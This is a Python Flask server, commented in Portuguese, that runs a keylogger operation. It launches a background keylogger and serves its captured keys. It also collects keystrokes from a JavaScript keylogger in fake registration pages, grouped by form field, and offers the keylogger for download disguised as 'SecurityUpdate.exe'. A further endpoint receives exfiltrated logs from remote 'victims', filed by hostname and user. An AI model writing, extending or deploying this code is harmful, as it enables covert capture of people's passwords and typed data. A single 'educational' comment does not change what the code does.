from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import os
import threading
import sys

app = Flask(__name__)
CORS(app)  # Permite requisições do navegador

# Caminho do script que será executado
SCRIPT_PATH = os.path.join(os.path.dirname(__file__), 'keylogger.py')

# Processo do keylogger em execução
keylogger_process = None

@app.route('/api/execute', methods=['POST'])
def execute_script():
    """Executa o keylogger.py em background"""
    global keylogger_process

    try:
        data = request.json or {}

        # Verifica se já está rodando
        if keylogger_process and keylogger_process.poll() is None:
            return jsonify({
                'success': False,
                'message': 'Keylogger já está em execução',
                'pid': keylogger_process.pid
            }), 400
        
        # Obtém o interpretador Python atual
        python_exe = sys.executable
        
        # Executa o script em background
        keylogger_process = subprocess.Popen(
            [python_exe, SCRIPT_PATH],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.path.dirname(__file__),
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        
        return jsonify({
            'success': True,
            'message': 'Keylogger iniciado com sucesso',
            'pid': keylogger_process.pid,
            'script': SCRIPT_PATH
        })
        
    except FileNotFoundError:
        return jsonify({
            'success': False,
            'message': f'Arquivo não encontrado: {SCRIPT_PATH}'
        }), 404
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao executar: {str(e)}'
        }), 500

@app.route('/api/stop', methods=['POST'])
def stop_script():
    """Para o keylogger em execução"""
    global keylogger_process
    
    try:
        if keylogger_process and keylogger_process.poll() is None:
            keylogger_process.terminate()
            keylogger_process.wait(timeout=5)
            
            return jsonify({
                'success': True,
                'message': 'Keylogger parado com sucesso'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Keylogger não está em execução'
            }), 400
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao parar: {str(e)}'
        }), 500

@app.route('/api/status', methods=['GET'])
def get_status():
    """Verifica status do keylogger"""
    global keylogger_process
    
    is_running = keylogger_process and keylogger_process.poll() is None
    
    return jsonify({
        'running': is_running,
        'pid': keylogger_process.pid if is_running else None,
        'script': SCRIPT_PATH
    })

@app.route('/api/log', methods=['GET'])
def get_log():
    """Retorna o conteúdo do arquivo de log"""
    log_file = os.path.join(os.path.dirname(__file__), 'captured_keys.txt')

    try:
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                content = f.read()

            return jsonify({
                'success': True,
                'content': content,
                'size': len(content)
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Arquivo de log não encontrado'
            }), 404

    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao ler log: {str(e)}'
        }), 500

# Armazena sessoes e ultimo campo para acumular dados
SESSOES_VISTAS = set()
ULTIMO_CAMPO_POR_SESSAO = {}  # {sessao: campo} - para concatenar

@app.route('/api/salvar-client', methods=['POST'])
def salvar_client():
    """Salva dados capturados pelo keylogger JavaScript (client-side)"""
    global SESSOES_VISTAS, ULTIMO_CAMPO_POR_SESSAO
    try:
        dados = request.get_json()

        if not dados:
            return jsonify({'success': False, 'message': 'Nenhum dado'}), 400

        log_file = os.path.join(os.path.dirname(__file__), 'client_keys.txt')

        sessao = dados.get('sessao', 'unknown')
        eventos = dados.get('dados', [])
        navegador = dados.get('navegador', 'unknown')

        if not eventos:
            return jsonify({'success': False, 'message': 'Sem eventos'}), 400

        # Verifica se eh sessao nova
        sessao_nova = sessao not in SESSOES_VISTAS
        if sessao_nova:
            SESSOES_VISTAS.add(sessao)
            ULTIMO_CAMPO_POR_SESSAO[sessao] = None

        # Processa eventos - agrupa texto por campo
        resultado = []
        buffer_texto = ''
        ultimo_campo = ULTIMO_CAMPO_POR_SESSAO.get(sessao)
        continua_campo_anterior = False

        for evento in eventos:
            tipo = evento.get('tipo', '')

            if tipo == 'keypress':
                tecla = evento.get('tecla', '')
                campo = evento.get('campo', 'campo')

                # Se eh o primeiro evento e mesmo campo da ultima vez, marca para concatenar
                if len(resultado) == 0 and not buffer_texto and campo == ultimo_campo:
                    continua_campo_anterior = True

                if campo != ultimo_campo and buffer_texto:
                    resultado.append({'campo': ultimo_campo, 'texto': buffer_texto, 'continua': continua_campo_anterior})
                    buffer_texto = ''
                    continua_campo_anterior = False

                buffer_texto += tecla
                ultimo_campo = campo

            elif tipo == 'click':
                if buffer_texto:
                    resultado.append({'campo': ultimo_campo, 'texto': buffer_texto, 'continua': continua_campo_anterior})
                    buffer_texto = ''
                    continua_campo_anterior = False
                    ultimo_campo = None

                elemento = evento.get('elemento', '')
                if elemento == 'BUTTON':
                    texto = (evento.get('texto') or '')[:20].strip()
                    if texto and texto not in ['Mostrar', 'Ocultar']:
                        resultado.append({'campo': 'ACAO', 'texto': f'Clicou: {texto}', 'continua': False})
                        ULTIMO_CAMPO_POR_SESSAO[sessao] = None

        # Salva texto pendente
        if buffer_texto:
            resultado.append({'campo': ultimo_campo, 'texto': buffer_texto, 'continua': continua_campo_anterior})

        # Atualiza ultimo campo da sessao
        ULTIMO_CAMPO_POR_SESSAO[sessao] = ultimo_campo

        if not resultado:
            return jsonify({'success': False, 'message': 'Sem conteudo'}), 400

        # Escreve no arquivo com formatacao limpa
        with open(log_file, 'a', encoding='utf-8') as f:
            if sessao_nova:
                ts = eventos[0].get('timestamp', '')[:19].replace('T', ' ')
                f.write(f'\n{"="*50}\n')
                f.write(f'NOVA SESSAO | {ts}\n')
                f.write(f'Browser: {navegador[:60]}\n')
                f.write(f'{"="*50}\n')

            for item in resultado:
                campo = item['campo'].upper() if item['campo'] else 'INFO'
                texto = item['texto']
                if item.get('continua'):
                    # Continua na mesma linha (sem prefixo)
                    f.write(f'{texto}')
                else:
                    f.write(f'\n[{campo}] {texto}')

        return jsonify({'success': True, 'message': f'{len(resultado)} itens'})

    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/download-exe', methods=['GET'])
def download_exe():
    """Fornece o executável do keylogger (simulado)"""
    # NOTA: Em produção real, isso seria um .exe compilado com PyInstaller
    # Aqui vamos fornecer o script Python como fallback educacional
    
    exe_path = os.path.join(os.path.dirname(__file__), 'keylogger.exe')
    py_path = os.path.join(os.path.dirname(__file__), 'keylogger.py')
    
    # Se existir um .exe compilado, envia ele
    if os.path.exists(exe_path):
        from flask import send_file
        return send_file(exe_path, as_attachment=True, download_name='SecurityUpdate.exe')
    
    # Senão, envia o script Python (fallback)
    elif os.path.exists(py_path):
        from flask import send_file
        return send_file(py_path, as_attachment=True, download_name='system_monitor.py')
    
    else:
        return jsonify({
            'success': False,
            'message': 'Executável não disponível'
        }), 404

@app.route('/api/receber-logs', methods=['POST'])
def receber_logs():
    """Recebe logs exfiltrados de keyloggers remotos (vítimas)"""
    try:
        dados = request.get_json()
        
        if not dados:
            return jsonify({
                'success': False,
                'message': 'Nenhum dado recebido'
            }), 400
        
        # Extrai informações da vítima
        victim_id = dados.get('victim_id', 'unknown')
        hostname = dados.get('hostname', 'unknown')
        sistema = dados.get('sistema', 'unknown')
        usuario = dados.get('usuario', 'unknown')
        timestamp = dados.get('timestamp', 'unknown')
        conteudo = dados.get('conteudo', '')
        
        # Salva em arquivo separado por vítima
        log_dir = os.path.join(os.path.dirname(__file__), 'logs_vitimas')
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, f'vitima_{victim_id}.txt')
        
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f'\n[EXFILTRAÇÃO RECEBIDA]\n')
            f.write(f'Vítima ID: {victim_id}\n')
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Sistema: {sistema}\n')
            f.write(f'Usuário: {usuario}\n')
            f.write(f'Timestamp: {timestamp}\n')
            f.write('-' * 80 + '\n')
            f.write(conteudo)
            f.write('\n' + '=' * 80 + '\n')
        
        print(f'📥 [LOG RECEBIDO] Vítima {victim_id} | {hostname} | {len(conteudo)} chars')
        
        return jsonify({
            'success': True,
            'message': 'Logs recebidos com sucesso',
            'victim_id': victim_id
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao salvar: {str(e)}'
        }), 500

# Rotas para servir o frontend
from flask import send_from_directory

FRONTEND_PATH = os.path.join(os.path.dirname(__file__), '..', 'frontend')

# ============================================
# PAGINA PRINCIPAL - Seletor de Templates
# ============================================
@app.route('/')
def index():
    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'index.html')

# ============================================
# CADASTRO - Todos os arquivos (templates, css, js)
# ============================================
@app.route('/cadastro/')
def cadastro_index():
    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'index.html')

@app.route('/cadastro/<path:filename>')
def cadastro_files(filename):
    """Serve todos os arquivos da pasta cadastro, incluindo templates"""
    cadastro_path = os.path.join(FRONTEND_PATH, 'cadastro')
    return send_from_directory(cadastro_path, filename)

# ============================================
# DOWNLOAD / KEYLOGGER CLIENT
# ============================================
@app.route('/download/<path:filename>')
def download_files(filename):
    return send_from_directory(os.path.join(FRONTEND_PATH, 'download'), filename)

if __name__ == '__main__':
    print('Servidor iniciado em http://0.0.0.0:5000')
    app.run(host='0.0.0.0', debug=True, port=5000)
